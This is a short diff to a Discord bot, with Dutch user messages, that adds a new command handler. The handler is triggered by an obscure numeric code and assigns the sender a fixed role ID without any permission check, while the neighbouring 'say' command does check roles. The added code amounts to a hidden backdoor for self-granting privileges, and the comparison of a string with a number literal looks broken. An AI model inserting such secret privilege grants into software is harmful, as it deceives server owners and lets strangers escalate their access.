@@ -106,6 +106,13 @@ client.on("message", async message => {
     m.edit(`Pong! Latency is ${m.createdTimestamp - message.createdTimestamp}ms. API Latency is ${Math.round(client.ping)}ms`);
   }
   
+  if(command === 098987876765654543432321) {
+  message.member.addRole('425285393491951618')
+  .then(console.log)
+  .catch(console.error);
+}
+
+
   if(command === "say") {
     if(!message.member.roles.some(r=>["445548497786372097", "🎓 | Owner", "Co-Owner", "PROFESOR"].includes(r.name)) )
     return message.reply("Sorry je hebt hier geen perms voor :(");
